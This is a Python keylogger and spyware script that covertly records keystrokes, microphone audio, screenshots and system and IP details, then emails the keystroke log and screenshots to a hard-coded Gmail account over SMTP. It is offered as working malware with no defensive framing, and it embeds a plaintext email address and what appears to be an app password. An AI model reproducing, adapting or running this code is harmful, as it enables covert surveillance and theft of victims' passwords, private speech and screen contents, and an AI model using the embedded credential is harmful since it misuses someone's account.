# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import pynput
from pynput.keyboard import Key, Listener
import logging

import time
import os

import pyaudio
import wave

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

key_info = r"/key_log.txt"
system_info = r"/sys_details.txt"
audio_info = r"/audio_rec.wav"
screenshot_info = r"/screenshot.png"
log_dir = r"/Users/kenluong/Developer/python"

audio_time = 10
iter_time = 20
iter_end = 3

email_addr = "anteikuu20@gmail.com"
password = "erfe mdvm mnck pghf"
toaddr = "anteikuu20@gmail.com"

def send_email(filename, attachment, toaddr):
    fromaddr = email_addr

    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"

    body = "Body_of_the_email"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, password)
    text = msg.as_string()

    server.sendmail(fromaddr, toaddr, text)
    server.quit()

send_email(key_info, log_dir + key_info, toaddr)

def system_details():
    with open(log_dir + system_info, "a") as f:
        hostname = socket.gethostname()
        ip_addr = socket.gethostbyname(hostname)
        try:
            ip_public = get("https://api.ipify.org").text
            f.write("Public IP Address: " + ip_public + "\n")

        except Exception:
            f.write("Failed to retrieve Public IP Address\n")

        f.write("Processor: " + platform.processor() + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + ip_addr + "\n")

system_details()

def mic_audio():
    chunk = 1024
    format = pyaudio.paInt16
    channels = 1
    freq = 44100

    p = pyaudio.PyAudio()

    stream = p.open(format=format, channels=channels, rate=freq, input=True, frames_per_buffer=chunk)

    print("start recording...")

    frames = []
    for i in range(0, int(freq / chunk * audio_time)):
        data = stream.read(chunk)
        frames.append(data)

    print("recording stopped")

    stream.stop_stream()
    stream.close()
    p.terminate()

    wf = wave.open(log_dir + audio_info, "wb")
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(format))
    wf.setframerate(freq)
    wf.writeframes(b''.join(frames))
    wf.close()

mic_audio()

def screenshot():
    im = ImageGrab.grab()
    im.save(log_dir + screenshot_info)

screenshot()

iter_num = 0
start_time = time.time()
stop_time = time.time() + iter_time

while iter_num < iter_end:

    keys = logging.basicConfig(filename=(log_dir + key_info), level=logging.DEBUG, format='%(asctime)s: %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')

    def on_press(key):
        global curr_time
        curr_time = time.time()
        logging.info(str(key))

    def on_release(key):
        if key == Key.esc:
            return False
        if curr_time > stop_time:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if curr_time > stop_time:
        with open(log_dir + key_info, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_info, log_dir + screenshot_info, toaddr)

        iter_num += 1

        curr_time = time.time()
        stop_time = time.time() + iter_time
